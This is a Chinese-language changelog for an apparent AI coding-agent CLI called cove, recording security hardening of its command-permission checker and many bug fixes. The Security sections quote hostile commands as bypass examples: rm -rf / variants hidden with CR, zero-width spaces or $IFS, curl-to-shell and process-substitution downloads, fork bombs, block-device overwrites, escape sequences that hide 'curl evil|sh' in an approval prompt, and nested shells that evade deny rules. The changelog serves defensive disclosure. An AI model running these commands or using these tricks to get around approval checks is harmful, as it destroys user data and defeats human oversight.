@@ -1,5 +1,337 @@
 ﻿## [Unreleased]
 
+## [12.0.0] - 2026-09-30
+
+### Added
+- **`/restart`**：保存会话后重启 cove，新进程以 `-r <会话 ID>` 接着当前会话（空会话则新开），
+  让新装的技能、插件、配置文件改动或升级后的二进制生效。退出部分与 `/exit` 相同；启动参数沿用，
+  去掉 `-r`/`--resume` 与 `--image`/`--file`。Unix 用 exec 原地替换；Windows 没有 exec，首次重启后
+  原进程留作监督进程，之后的重启由它统一发起（子进程以退出码 75 + 参数文件请求），不会逐层叠加进程。
+  任务运行中不能执行，headless 模式不支持。
+- **`/trust`**：信任当前项目的 `.cove.json`（见下方 Security），`/restart` 后其中需要信任的设置生效。
+
+### Security（第三轮审查）
+- **`/history delete ..` 删掉整个会话目录**：会话 ID 只经 `filepath.Base` 处理，`..` 原样保留，归档目录
+  `archive/..` 解析回会话目录本身，`RemoveAll` 把所有会话、索引和归档一起删掉；`/` 则删掉全部归档。现在
+  不是普通文件名的 ID 一律按“没有这个会话”处理。
+- **`browser` 工具标记为只读，但 `screenshot` 会写文件**：只读子代理和 plan 模式都能用它覆盖工作区里的任意
+  文件（绕过读后写检查与原子替换）。现在 `browser` 不再是只读工具（截图需要授权，与 `write` 一样）；截图只写
+  `.png`、不覆盖非 PNG 文件、按 `write` 的方式原子写入。
+- **`write`/`edit` 可以写 NTFS 备用数据流**：`README.md:notes` 这样的路径会在工作区里写出对 git、资源管理器和
+  `read` 都不可见的隐藏流。现在所有文件工具一致拒绝卷标之后带 `:` 的路径。
+- **模型起的名字可以指向记忆目录的记账文件**：dream 的 write/edit、记忆提取的 `FILE:` 和 `/memory add` 都接受
+  `.consolidate-lock`、`.memory-write.lock`、`.last-extraction.json` 这类点文件名，能覆盖正在运行的整理锁。现在
+  记忆文件名一律不能以点开头（提取时去掉前导点，dream 与 `/memory add` 直接报错）。
+- **单独的 CR 与不可见空白可以绕过全部命令检查**：PowerShell 把单独的 `\r`、NEL、U+2028/U+2029 当作换行，把
+  FF、VT、不间断空格等 Unicode 空白当作参数分隔，而分词器把 `\r` 当空白、对其余一无所知。于是
+  `ls<CR>Remove-Item -Recurse -Force …` 算只读并自动批准，`go test ./...<CR>rm -rf ./src` 被记住的 `go test`
+  前缀放行，`echo hi<CR>Remove-Item … C:\Windows` 绕过硬拦截，`find . -type f<FF>-delete` 算只读。现在所有
+  shell 的分词器都按这个规则切分；含这类字符、其他控制字符、零宽/双向控制等不可见格式字符或非法 UTF-8 的命令
+  一律不算只读、不自动批准、不被记住的前缀/分组/`param_match` 规则覆盖，改为询问；硬拦截同时按去掉不可见字符
+  后的形式检查（`r<零宽空格>m -rf /` 也拦）。
+- **deny/ask 规则看不到嵌套命令**：整工具允许 bash 再 deny `git push` 时，`bash -c 'git push origin main'`、
+  `eval '…'`、`xargs -0 git push`、`find . -exec git push \;`、`git -c alias.p=push p` 都放行。现在规则会看进
+  `sh -c`/`bash -c`、`cmd /c`、`powershell "…"`、`eval`/`iex`、`xargs`、`find -exec/-execdir/-ok`、管道进 shell 的
+  heredoc；命令行上定义了 git 别名（`git -c alias.*=`、`--config-env`、`git config alias.*`）时所有 git 规则都生效；
+  嵌套命令的程序是变量（`bash -c "$CMD"`、`eval "$x"`）时所有 deny/ask 规则都生效。
+- **硬拦截漏网**：`rm -rf /**`、`/*/`、`/etc/**`、`~/**`（只剥一个 `*`、`*` 后的 `/` 不处理）；正斜杠写法的
+  `C:/Windows`、`C:/Users`、`c:/program files/`；Git Bash 的 `/c`、`/c/`、`/c/Windows`、`/mnt/c`、`/cygdrive/c`；
+  `/{etc,usr}` 花括号展开；PowerShell 数组参数 `.,C:\Windows`；`rm -rfvvv /`（短选项只认 1–4 个字母）；
+  `curl … | bash -s -- install`、`| sh -s x`、`| bash /dev/stdin`、`| bash -`、`| bash -e`、`| python3 -`；
+  `powershell "Remove-Item -Recurse -Force C:\Windows"`（第一个位置参数就是 -Command）；`find -P / -delete`、
+  `find -L / -exec rm -rf {} +`（GNU 的 `-H/-L/-P/-D/-O` 在路径之前）；`cat <<'EOF' | sh` 的 heredoc 正文；
+  `rm$IFS$9-rf$IFS$9/`；`shred`/`tee`/`cp`/`mv` 写入块设备（`/dev/sd*`、`/dev/nvme*`、`\\.\PhysicalDrive*`）；
+  `function f { f|f& }; f` 形式的 fork bomb。以上现在全部拦截。此外 cmd 风格开关只对 `del`/`erase`/`rd`/`rmdir`
+  跳过（以前任何 `/x` 都被当开关，`rm -rf /c` 从未被判定）。
+- **`policies.json` 的 `param_match.command` 是整行前缀匹配**：`{"param_match":{"command":"git status*"}}` 的
+  allow 会放行 `git status; rm -rf ./src`。现在按简单命令逐条匹配：allow 要求行内每条命令都匹配且不含命令替换
+  或写文件的重定向；deny/ask 只要任一条命令（含嵌套命令）匹配即生效；末尾单个 `*` 按整词扩展（`git status*`
+  不匹配 `git statusx`）。
+- **question 工具的提问文字未经清洗**：标题、问题、选项和说明直接打印，模型可以用 `\x1b[2A\x1b[2K…` 在你按数字
+  之前重画选项列表。现在与授权框一样经 `VisibleControls` 显示（`\e[2A` 原样可见）；授权提示里的“记住范围”行
+  和“已记住的规则未覆盖”说明同样处理，MCP 服务器/工具名不能再借此重绘授权框。
+- **`VisibleControls` 不显示零宽字符**：`echo hi <零宽空格>#; rm -rf ~` 在授权提示里看起来是注释，bash 却会执行
+  `rm`。零宽空格/连接符/BOM/软连字符/标签字符等现在显示为 `\uXXXX`；emoji 组合序列里的零宽连接符保持原样。
+
+### Fixed（第三轮审查）
+- **bash 下 `git stash show -p stash@{0}`、`git diff HEAD@{1}`、`git log @{u}..HEAD` 被当成未知命令**：未加引号的
+  `{`/`}` 会把行切开。bash 里花括号只在展开（`{a,b}`、`{1..3}`）或词首命令组时特殊，词内的 `X@{…}` 现在按字面
+  处理，这些只读写法可以免询问并记住；花括号展开仍询问，PowerShell 下未加引号的花括号仍询问。
+- **auto 模式**新增自动批准：`dotnet test/build/run`（带 `--force` 除外）、`pytest`（带 `--basetemp` 除外）、
+  `go list`、`gofmt`、不带参数的 `make`，以及 `npm run test:unit`、`lint:fix`、`build:prod`、`pnpm test:e2e`、
+  `yarn lint:ci` 这类带冒号后缀的 test/lint/build 脚本。
+- **输入行里的 ⚠️ ❤️ ✔️ 1️⃣ 或多人 emoji 宽度算错**：编辑器按单个字符累加宽度，VS16/ZWJ 组合序列算 1 格实际占
+  2 格，行溢出、重绘后留下幽灵行。单行、多行和任务运行中的底部输入行现在都按字素簇计算，可见窗口不再从
+  emoji 序列中间开始。
+- **一次没收到光标位置应答就永久关闭底部输入行**：应答若在 Ctrl+R 搜索、粘贴或 `ReadLine` 返回后到达会被丢弃
+  （搜索还会被意外退出），300 ms 超时后本会话不再固定输入行。现在所有读取 CSI 的地方都把光标应答交给等待者；
+  一次未应答只暂停 30 秒，连续 3 次才停用，之后收到任何应答即恢复。
+- 移动端：任务进行中 `Reset` 只清空消息不取消请求，旧任务的工具结果追加到新会话开头，之后每个请求都被拒绝。
+  现在 `Reset`/`Init` 取消进行中的请求并丢弃旧代次的结果（以 `cancelled: conversation reset` 结束）。
+- 诊断：`~/.cove` 无写权限时被额外误报为致命的“磁盘空间不足”（任何写失败都算磁盘满）。现在只有 ENOSPC/EDQUOT
+  （Windows 112/39）才报磁盘不足，其他失败跳过该项并指向“数据目录”检查。
+- 渲染：以 8 位 ST（0x9C，UTF-8 形式 C2 9C）结尾的 OSC/DCS 序列不被识别为结束，吞掉其后最多 256 字节正文。
+- **流式响应里的供应商错误不触发切换**：Anthropic 的 `event: error`（`overloaded_error`、`rate_limit_error`）和
+  OpenAI 兼容端点的 `{"error":{"code":503}}` 数据块只包成普通文本错误，分类为未知，供应商回退与冷却都不生效。
+  现在按等价的 HTTP 状态码处理（529/429/500/401/400…），错误文本形如 `API error 529: provider stream error: …`。
+- **计费缺少 Claude 4 / 4.1 / 4.5 代的价格**：Sonnet 4/4.5、Opus 4/4.1/4.5 按默认单价（$0.435/$0.87 每百万
+  token）计算，少算 7–35 倍，`max_budget_usd` 形同虚设。已按公开价目补齐；**未收录的 `claude-*` 型号改按 Opus
+  单价（$15/$75）估算**，宁可高估，所以这类型号的 `/cost` 数字会比以前高；非 Claude 的未知型号仍用默认单价。
+- Opus 4 / 4.1 缺少输出上限（32000）：按 200k 窗口预留 50000 输出，每次请求都被 400 拒绝。同时补上 Sonnet
+  4/4.5、Opus 4.5 的 64000。
+- OpenAI 推理模型（o1/o3/o4/gpt-5 系列）拒绝 `max_tokens`：现在按模型名改发 `max_completion_tokens`，经网关
+  转发时同样生效；其他模型和第三方兼容端点不变。
+- `anthropic-ratelimit-*-reset` 是 RFC 3339 时间戳，之前只按时长解析，`/ratelimit` 里的重置倒计时永远是 0。
+- 所有供应商都在冷却期时按 Ctrl+C 取消请求，报出的是上一次陈旧的供应商错误而不是“已取消”。
+- **Windows 上把活着的整理进程判成已死**：`os.FindProcess` 对更高完整性级别或其他用户的进程返回拒绝访问，
+  代码把一切错误当作“进程不存在”，于是活着的持锁者的锁被当作陈旧锁接管（两个整理同时改同一批文件），
+  `recoverDeadWorker` 也会回滚活 worker 的锁。现在用最小权限打开进程并查询退出码，拒绝访问视为存活；
+  Unix 侧 `kill(pid, 0)` 返回 EPERM 同样视为存活（原先 `Signal(nil)` 对任何 pid 都返回错误，锁完全没有互斥）。
+- 整理完成后到任务收尾之间执行 `/dream cancel`，`RollbackConsolidationLock` 不检查是否仍持有锁，把刚写好的完成
+  标记和时间戳删掉，那批会话下次又被整理一遍。现在不持有锁时回滚不碰文件。
+- **文件锁破陈旧锁时会移走别人刚建的新锁**：判定陈旧和重命名之间，旧持有者释放、新持有者建锁，重命名移走的是
+  新锁——要么两个写者都以为自己持锁，要么没人删它、后来者一律等到 30 秒超时。现在先读锁内容再判定，移走后
+  内容不一致就放回去；读不到内容不视为陈旧。
+- `/memory add` 绕过记忆写锁（进程内锁与目录锁文件），会被同时进行的记忆提取“读→追加→重命名”覆盖，或反过来
+  覆盖提取刚写的内容。现在与提取、dream 同一顺序取锁；锁被长期占用时提示“记忆目录正被另一个 cove 进程写入，请稍后重试”。
+- 网页搜索摘要按字节偏移截取，切在多字节字符中间时给模型发出非法 UTF-8（部分供应商直接拒绝请求）。
+- **文件名接近 255 字节时 `write`/`edit` 失败**：临时文件名多出约 21 字节超过系统限制，`CreateTemp` 报
+  “文件名语法不正确”，而旧的直接写入是能写的。现在过长的名字用哈希缩短临时文件名，仍在同一目录原子替换。
+- `webfetch` 的授权判断用原始输入判定是否内网地址，`example.com/?next=http://127.0.0.1/` 被当成访问
+  127.0.0.1 拒绝，而实际抓取的是 `https://example.com`。现在先按抓取时同样的方式规范化 URL 再判断。
+- `task_stop` 对不存在的任务 ID 也回答“已停止”，现在与 `task_get`/`task_update` 一样返回未找到错误。
+- **循环检测把编辑不同文件当成重复调用**：`edit`/`write` 用 `file_path`/`path`/`filepath`/`file` 这些参数别名传路径时，
+  指纹里只剩工具名，连续编辑 10 个不同文件到第 5 次就被判为循环并强制终止。指纹、压缩摘要、后台回顾、文件类
+  技能提示和文件活动统计现在都识别这些别名。
+- **以别名调用工具时不建检查点**：模型发出 `Edit`/`Write`/`PowerShell`/`Agent` 这类别名，检查点、shell 写判断和
+  子代理判断都按原始名比较，文件改了却没有快照，`/undo` 无法回退。现在在分发前统一换成注册表里的规范名；
+  `PowerShell` 别名执行且退出码非零的命令也会标记为失败。
+- `-p --max-turns N` 下模型在最后一次调用给出答复但 todo 仍有未完成项时，答复被“迭代上限”错误取代（todo 收尾
+  提示没有像其他提示那样让位于已有答复）。
+- 过载/限流后切换到备用模型只改了本轮模型字段，后续的工具输出上限、窗口收缩、上下文用量显示仍按失败的模型计算。
+- 上一轮的工具连续失败计数不清零，新请求第一批工具一失败就注入“3+ 次失败”提示并切换模型；现在新请求重置，
+  恢复同一中断请求时保留。
+- 后台技能回顾读取的是当时的会话 ID，与 `/new`、`/resume` 并发时会把学到的技能记到新会话名下（也是一处数据竞争）；
+  现在在回合线程上捕获会话 ID。
+- 验证命令输出（如中文编译错误）截尾时按字节切，可能切在多字节字符中间，给模型发出非法 UTF-8；20000 字节的输出
+  上限同样如此。
+- **REPL 不去掉输入首尾空白**：Tab 补全留下的尾随空格让 `/history ` 试图恢复名为空的会话、`/compact ` 落到
+  只会提示“请用 REPL 内置路径”的通用命令、`exit ` 被当成消息发出，纯空格行会向模型发一次空消息（计费，且
+  部分供应商直接报错）。现在与 headless 一致，先去掉首尾空白。
+- 不带参数的 `/history detail`、`/history delete` 会去恢复名为 detail/delete 的会话，而不是打印用法。
+- headless 下 `/history` 之后若干轮再输入一个数字仍会切换会话（选择状态不清除）。
+- 任务 panic 恢复时先清空当前任务再回收插入的指引，回收的指引丢掉了“这是在哪个任务期间补充的”上下文。
+- 激活 profile 时把 profile 拥有的字段清为 profile 存不下的值（`/config budget 0`）只写到顶层，profile
+  里的旧值留着，重启后又回到旧值。
+- MCP：`tools/list` 或 `resources/list` 失败（超时、JSON-RPC 错误）被静默吞掉，服务器显示为已连接但 0 个
+  工具且无报错；一次自动重连用完后再断线的 stdio 服务器不再被回收（子进程不 Wait、管道一直开着），现在
+  关闭并在 `/mcp list` 里给出原因。
+
+### Security（系统性测试发现）
+- **`eval`/`iex` 包裹的灾难命令不被硬拦截**：`eval 'rm -rf /'`、`bash -c 'eval "rm -rf /"'`、`iex 'rm -rf /'`、
+  `Invoke-Expression "Remove-Item -Recurse -Force C:\"`。deny 规则那条路径早已展开 eval，灾难扫描没有；现在共用同一
+  个展开函数。
+- **`xargs`/`find -exec` 行内写死的危险目标不被硬拦截**：`xargs rm -rf /`、`xargs -0 rm -rf /`、`find . -exec rm -rf / \;`、
+  `find . -execdir rm -rf ~ +`（只拦了 `echo / | xargs rm -rf`）。现在把 xargs/-exec 之后的词当独立命令再判一遍，
+  嵌套的 shell、eval、再一层 xargs 也拆开看。
+- **进程替换 / 命令替换执行下载内容不被硬拦截**：`bash <(curl …)`、`source <(curl …)`、`. <(curl …)`、
+  `python3 <(curl …)`、`sh -c "$(curl …)"`、`eval "$(curl …)"`、反引号形式、直接执行 `$(curl …)`、
+  `echo "$(curl …)" | sh`、`iex (iwr …)`、`iex (irm …)`；BSD `fetch` 也算下载源。只把下载结果当数据参数的
+  （`python3 parse.py <(curl …)`、`diff <(curl a) <(curl b)`、`git commit -m "$(curl …)"`）不拦。
+  仍未覆盖：`iex (New-Object Net.WebClient).DownloadString('…')`。
+- **顶层程序名是变量时 deny/ask 规则不命中**：整工具允许 bash 再 deny `git push`，`$GIT push`、`G=git; $G push`、
+  `${GIT} push`、`$env:GIT push`、`%GIT% push`、`rm${IFS}-rf${IFS}/tmp/x` 都放行（嵌套命令里的变量程序早已按
+  “所有 deny/ask 都命中”处理，顶层没有）。现在一致；PowerShell 的 `%`（ForEach-Object 别名）和单独的 `$_.Name`
+  不算变量程序。
+- **灾难命令仍可被 `[a]`/`[p]` 记住**：`rm -rf /`、`mkfs.ext4 /dev/sda1` 会给出可记住的前缀或组（引擎会先硬拦截，
+  实际走不到提示，但违反不变量）。现在灾难行不提供任何可记住规则；程序词带 `%VAR%` 的命令也不再记住前缀
+  （cmd 会先展开变量，那条前缀等于放行任意程序）。
+
+### Fixed（系统性测试发现）
+- **引号里的 fork bomb 文本被误拦**：`echo ":(){ :|:& };:"`、`git commit -m ":(){ :|:& };:"` 被硬拦截；现在 fork bomb
+  正则作用在去掉引号内操作符后的文本上，不带引号的写法和 `bash -c '…'`/`eval '…'` 里的照样拦。
+- **git 组的 ask/deny 规则拦下只读列表命令**：`git branch -a`、`git tag`、`git stash list`、`git remote -v` 在 auto 模式
+  下也会询问。手册和函数注释都写明组规则只覆盖“非只读用法”；现在只读用法先判出来直接跳过。
+- **非普通文件名的会话 ID 能“保存成功”**：`..`、`/`、空串、空白、`.`、`archive/..` 等 ID 经 `filepath.Base` 后是空 key，
+  Save 把它们全写进同一个列表里看不见的 `.jsonl`，`Load("..")` 还能读出来。现在保存直接报 `ErrInvalidID`
+  （对 `errors.Is(err, fs.ErrNotExist)` 为真），读取/删除按“会话不存在”处理。
+- **会话 ID `index` 保存会静默丢失、删除会清空所有会话的索引**：`Save("index")` 写出 `index.jsonl`，Load 却以保留 ID
+  拒绝；`Delete("index")` 删掉 `index.json` 后写回空索引，其他会话的列表元数据全部丢失。现在三者都在碰磁盘前返回
+  `ErrReservedID`。
+- **ID 首尾带空格的会话让自动清理删错文件**：Prune 从文件名取 ID 时会 TrimSpace，`" padded .jsonl"` 被当成 `"padded "`，
+  于是去删另一个（不存在的）文件并计作已删，本会话文件留着而索引条目丢失，“当前会话受保护”也失效。现在会话存储
+  不再修剪 ID（只在解析用户输入 `-r`/`/resume` 时去首尾空白），Prune、目录扫描、索引三处同源取 key；两个文件都不
+  存在时不计入删除数。`/history clean` 和 dream 扫描这类文件名时也不再取错 ID。
+- **Windows 上含 `:` 的会话 ID 留下删不掉的临时文件**：保存虽然报错，`.cove-tmp-ab` 已作为宿主文件加数据流建出来，
+  清理只删了数据流。现在含 `:` 的 key 在建任何文件之前就拒绝；`fsatomic.WriteFile` 对这类文件名同样在 CreateTemp
+  之前返回错误。
+- **删除当前激活的 profile 后其设置不落盘**：profile 的值仍在生效，但与加载视图比对“没有变化”，`/profile delete` 本身
+  和随后 `/model <同一个值>` 都不写文件（提示却说“已保存”），下次启动悄悄回到顶层旧值。现在删除激活 profile 时，
+  它设置过的键按当前生效值写到顶层，文件与运行状态一致。
+- **headless 下 `/history` 的选号状态跨过普通消息**：第三轮记录为已修，实际未落盘。`/history`、一条普通消息、再输入
+  `1`，`1` 仍会恢复会话；现在只有紧随 `/history` 的下一行可以选号，与 REPL 一致。
+- **Anthropic 流收到 `message_stop` 后服务器不关连接被判为“流卡住”**：读循环在终止事件后继续等下一行，空闲看门狗
+  超时，一个已完整的回答被当成 `stream stalled` 重试甚至回退到备用模型。现在 `message_stop` 像 OpenAI 的 `[DONE]`
+  一样直接结束读取。
+- Anthropic 流式与非流式对多个文本块（文本 → 工具调用 → 文本）的拼接不一致：非流式用换行连接，流式直接拼成
+  `beforeafter`。现在流式在新文本块开始时同样补一个换行（回调里也能看到）。
+- **Markdown 流式渲染：缩进表格在缩进处被分块时拆成两张表**：`startLine` 先因“已有表格行”结束表格，再判断“行首只有
+  缩进、尚未决定是什么行”，缩进单独落在分块末尾时表格提前输出且表头不加粗。现在先等下一个字节再决定。
+- **循环检测对别名工具名分开计数**：指纹用模型给的原始工具名，`Edit` 与 `edit` 交替编辑同一文件时循环检测的历史被
+  拆成两份，检测阈值形同减半。指纹现在用注册表的规范名。
+- **plan 模式下仍为每批写入调用建 git 快照**：plan 会拒绝全部写入，快照（约 1.5 s 一次）没有任何可供 `/undo` 恢复的
+  内容。现在 plan 模式不建检查点。
+- **plan 模式拒绝只读 shell 命令**：手册与 plan 门禁都规定整行只读的 `bash`/`powershell` 命令在 plan 模式可以运行，
+  但引擎只在 default 模式预批准只读行，shell 工具看到 plan 就自行拒绝，门禁里放行只读行的分支从未走到，
+  `git status`、`ls` 在 plan 下一律被拒。现在 plan 模式同样预批准只读行；构建、写文件、重定向仍拒绝。
+- **在其他项目完成一轮会误删本项目的中断草稿**：任务成功结束时无条件清除草稿文件（`/new`、`/continue` 也一样）。
+  现在只有同一项目、同一会话完成的回合才清除它。
+- **任务运行中进程被强杀（崩溃、断电、kill -9）后没有中断草稿**：草稿只在回合返回错误时才写。现在任务开始时就
+  保存草稿（原因“任务未完成（cove 在任务运行中退出）”，带会话 ID），正常完成后清除；下次启动会提示，输入“继续”
+  回到被中断的那个会话接着做，请求不会重复写入会话（会话末尾已有同一条未回答的请求时改发“继续”）。同一项目开始
+  新任务会替换旧草稿，别的项目的草稿不受影响；`-p`/headless 不保存草稿。
+- **任务 panic 后“继续”会把原请求重发一遍**：引擎回合里的 panic 直接穿过回合入口，没有像取消那样打中断标记、
+  补齐悬空的工具结果并保存会话；REPL 恢复后输入“继续”被当成新请求追加，模型看到同一请求两次并重做已完成的
+  步骤。现在回合入口捕获 panic、标记为“内部异常”的可恢复中断后再抛出，“继续”从中断处续跑。
+- 手册修正：任务因取消、撞上限、出错结束时未生效的指引是**保留**给 `/continue`（`[已保留]`），只有正常完成才自动
+  作为新任务排队（`[已排队]`）；此前手册把两种情况都写成了排队。
+
+### Security（第二轮审查）
+- **授权提示可被转义序列隐藏内容**：`StripControls` 会连同其后的文字一起丢掉 ESC 序列，
+  `echo hi\x1b]0;x; curl evil|sh\x07 done` 在提示里只显示 `echo hi done`，批准后 bash 照样执行被藏的部分。
+  授权提示与写入 diff 预览改用 `VisibleControls`，控制字符显示为 `\e`、`^G`、`‮` 等可见文本。
+- **ask/deny 组规则只拦常规用法**：对 git 组设了 ask 规则，`git push` 会询问，`git push --force` 反而放行。
+  现在组规则覆盖该程序的全部非只读用法；`--force-create` 等以被拒选项开头的写法、`npm --location=global`、
+  `--prefix` 不再算常规。yarn 不再有只读命令（`yarnPath` 让 `yarn --version` 也会执行仓库脚本）；
+  PowerShell 的 `-Path:\\host`、`FileSystem::\\host`，`ag --pag…`、`rg --hostname-bin`、
+  `docker compose config -o`、`file --comp` 需要授权。
+- **自动校验在陌生仓库里执行仓库脚本**：回合结束时自动推断的 `npm run build`、`cargo check`（`build.rs`）、
+  `dotnet build`、`npx tsc`、自动运行的测试等，在克隆来的仓库里改一个错别字也会无提示执行。现在只在受信任的
+  项目目录或 auto/bypass 模式下自动运行，否则跳过并提示一次；`/trust` 对没有 `.cove.json` 的项目信任其目录。
+- **`/profile save` 把项目 `.cove.json` 的 provider、`system_prompt` 等复制进全局 profile**，切到别的项目后仍生效。
+- **写入 diff 预览**同样改用可见控制字符，转义序列无法再藏住后面的内容。
+- **子进程 git 会使用仓库里夹带的裸仓库**：设置 `safe.bareRepository=explicit`。
+- **项目技能**：解析后指向项目之外的技能文件（符号链接、目录联接）不再加载；覆盖同名用户/内置技能时提示一次。
+- **API key 写进输入历史**：`/api-key sk-…`、设置凭据的 `/config`、带账号密码的 `/base-url` 不再存入
+  `input_history.jsonl`（已有的旧记录加载时隐藏，建议手动删除该文件）。
+- **截图与 draw_image**：拒绝 Windows 备用数据流路径（`main.go:x.png`）；draw_image 只写 `.png`，不覆盖非 PNG 文件。
+- **`.cove.json` 为符号链接、设备或超过 1 MiB 时忽略**（以前指向 `/dev/zero` 会让启动卡死）。
+
+### Fixed（第二轮审查）
+- **Windows 上 `/restart` 的监督进程被 Ctrl+C 杀掉**（`signal.Ignore` 在 Windows 上挡不住控制台事件），
+  第二次重启回到最初目录，`--replay` 被带进重启后的进程；`/trust` 在 `/cd` 之后信任的是旧目录的文件。
+- **todo 计划改为客观判断**：上一版按“请求里有没有‘继续’”收起旧计划，回答模型的提问（“A”）就会丢掉计划；
+  现在计划保留，只有本回合写过 `todowrite` 才发结束提示。
+- **git 状态行**：只读的 `git log`/`diff` 也会触发、干净时写“已提交并推送”像是本回合推送过；
+  失败或超时的 `git push`、带路径的 git 不触发。改为只在改动文件或运行会改变仓库的 git 命令后显示，措辞改为“工作区干净，与 origin/main 同步（按本地记录）”。
+- **并行工具**：同一文件的不同写法（相对/绝对路径、Windows 大小写）会被两个 edit 同时写；`agent`、MCP
+  工具与读操作同时运行。现在按读/写/其他三类分组、路径规范化后比较。
+- **压缩**：多任务会话里 `<original_request>` 保留的是第一个任务而不是当前任务，且多次压缩会层层嵌套；
+  去重占位符指向已被压缩掉的调用导致内容丢失；只裁剪时 `/compact` 误报“历史太短”。
+- **验证门禁期间 Ctrl+C 被记为验证失败**；循环检测警告后每次相同输出都再次触发、很快硬停；
+  `gemini-*-pro` 被当成快速模型；压缩后技能回顾停止；`shrinkForWindow` 未真正缩减也消耗重试。
+- **`/undo`**：非 ASCII 文件名的新文件删不掉；Windows 上 `core.autocrlf=true` 让恢复的 LF 文件变成 CRLF；
+  嵌套仓库导致中途失败且不给出回退用的备份哈希；刚 `git init` 的嵌套空仓库让检查点无法建立；
+  `/undo`、`/commit` 可在任务运行中执行。
+- **bash**：命令在后台留下进程（`npm run dev &`）时被判为“无法启动”并丢掉输出。
+- **read**：只检查前 8KB 的编码，后面是 GBK 或含 NUL 时照样当 UTF-8 返回；非 UTF-8 大文件整读进内存。
+- **webfetch**：`httpbin.org/get` 这类以 http 开头的裸域名不补协议；忽略页面字符集导致 GBK 页面乱码。
+  web_search 默认的 DuckDuckGo 结果全部被丢弃（重定向链接未解开）。
+- **Windows 上 write/edit 丢失文件属性**（隐藏的 `.env` 变成可见），改用 `ReplaceFileW` 保留属性、ACL 与数据流。
+- **draw_image** 大半径圆或超长线段会跑几个小时且无法取消。
+- **CLI**：会话结束后说“继续”可能跳到另一个历史会话；任务运行中贴图会中途换模型；`/history all 2`、
+  `/history <id>` 可在任务运行中切换会话；失败请求与中断草稿会带进别的会话或项目；`@` 附件会把整条消息的
+  换行压成一行，`-p` 的管道输入里出现 `@babel/core` 就失败；`-p` 管道 3 秒没数据就静默丢弃；
+  headless 永远以 0 退出、斜杠命令期间的 SIGTERM 不结束运行；`/skill create` 覆盖已有技能；
+  回答刚显示、回合还在收尾时输入“继续”会被拒绝（“当前有任务正在运行”），现在按普通输入送入任务或排队。
+- **API**：多 key 池里一个 key 失效（401）就让整轮失败或把整个供应商拉黑；切到备用供应商后再也不回主供应商；
+  中途失败的流式请求不计费；流停滞被当成未知错误；等待响应头超时被重试 3 次（本地最长约 1 小时）。
+- **记忆**：中文检索几乎匹配不到（整段中文被当成一个词）；一个超长记忆让语义检索永久失效；
+  整理与另一进程的记忆提取并发写同一文件时丢内容；整理用的 grep 可能把大文件整读进内存；
+  修剪会话时不删 `archive/` 归档；整理完成后同一会话 1 小时内 `/dream run` 被拒；整理先报告“已结束”
+  才写锁文件的完成标记，紧接着的 `/dream run` 或清理会与写锁撞上。
+- **会话**：保存后的 stat 可能把另一进程追加的内容当成自己的，之后改写时丢掉且不归档。
+- **技能与 hook**：`paths: src/api/*.go` 这类含目录的模式永远不匹配；CRLF、BOM、YAML 列表的 frontmatter
+  解析错误；hook 的 `matcher` 区分大小写，从 Claude Code 复制来的 `"Bash"` 永远不触发。
+- **界面**：流式清洗器在超长未结束的转义序列上是平方复杂度（160KB 卡 3 秒）；只改了结尾换行或换行符的
+  写入显示“内容不变”；表格不支持 ASCII 模式；窄窗口下转圈提示折行残留。
+- **遥测**：写入非原子，文件损坏后历史静默丢失。
+- **实时输出**：stdout 与 stderr 共用一个清洗器，一边残留的半个转义/字符会拼到另一边；重试时上一次尝试残留的
+  推理字节漏进新一次；网页搜索摘要里残留 HTML 属性。
+- **记忆写锁（今天新增）在 Windows 上偶发“拒绝访问”**：锁文件处于删除挂起状态时新建会被拒绝，原先只在随后
+  `stat` 仍看到文件时才重试，删除恰好完成就把错误抛给调用方；现在按占用重试，超时仍被拒才报错。
+
+### Security
+- **项目 `.cove.json` 不再被无条件信任**：以前克隆的仓库可以借它在启动时拉起任意 MCP 进程，或把
+  `provider.base_url` 指向别处、首个请求就收到用户的 API key。现在 `provider.*`、`mcp_servers`、
+  `done_verify_commands`、`system_prompt`、`memory_embedding`、`web_search`，以及放宽安全的
+  `permission_mode`/`done_verify_auto`/`done_verify_tests`/`max_budget_usd`/`max_sessions` 取值，须经
+  `/trust` 才生效；信任按文件内容的 SHA-256 记在 `trusted_projects.json`，内容一改即失效。启动时提示被忽略的字段。
+- **routine 规则被选项值绕过**：`firstWordSubcommand` 把全局选项的值当子命令，记住 npm 组后
+  `npm --prefix test publish`、`pnpm -C x publish`，记住 go 组后 `go -C x install` 都被直接放行。子命令前有选项即不算常规。
+- **bash 反斜杠绕过硬拦截与只读判定**：`r\m -rf /`、`rm \<换行>-rf ~` 不触发硬拦截，`find . -f\<换行>ls x`
+  被当成两段只读命令。bash 下按 bash 规则理解续行与转义，无法确定时一律询问。
+- **curl 上传/写文件被判为安全**：`curl --json @私钥 URL`、`-XDELETE`、`-D 文件` 等在 auto 模式自动执行。
+  改为选项白名单；PowerShell 下 `curl`/`wget` 是 `Invoke-WebRequest` 别名，另按严格白名单判断。
+- **可能执行项目脚本的“只读”子命令**：`yarn doctor`、`composer freeze` 等会执行同名脚本却免授权；
+  `git branch -uorigin/main`、`--set-u=` 缩写、`date --s…`、`pnpm audit --fix` 也被误判为只读。
+- **内置 grep/glob、repo map、截图顺着符号链接越出工作目录**：仓库里指向 `~/.ssh/id_rsa` 的链接能被免授权的
+  grep 打印出来；截图输出可经目录联接写到工作区外。Windows 上 `\Users\…` 这类以根开头的链接目标也按链接所在盘解析。
+- **hook 的阻止被忽略**：`BeforeTool` hook 非零退出时输出被丢弃，打印的 `{"continue": false}` 不起作用。
+  现在非零退出同样认这条 JSON，退出码 2 也表示阻止（原因取自 stderr）。
+
+### Fixed
+- **`/new`、`/resume` 之后每次写文件都报失败**：`fileHistory` 被置为 nil，写入即 panic；文件其实已写入，
+  模型却被告知失败而反复重试，本轮改动的文件、验证门禁与自审全部漏记。
+- **`/plugin enable` 删除加载失败的插件目录**：该插件目录不带 `.disabled` 后缀，`RemoveAll` 删掉的就是它本身。
+- **记忆提取覆盖已有记忆**：模型只看到文件名，`MODE: write` 却整文件替换；现在已有同名文件一律追加。
+- **以“继续”开头的普通指令被吞掉**：“继续把 README 翻译成英文”会恢复另一个历史会话并丢掉这句话；
+  现在只有单独的“继续”/`continue` 才触发恢复。
+- **含中文的行按 Tab 补全导致崩溃**：补全后光标按字节计算，超出按字符计数的缓冲区。
+- **Ctrl+D 退出不停止运行中的任务**，也不回答正在等待的授权提示；输出流进行中退出时终端滚动区域未复位。
+  所有退出路径（Ctrl+D、`/exit`、`/restart`）现在走同一个流程。
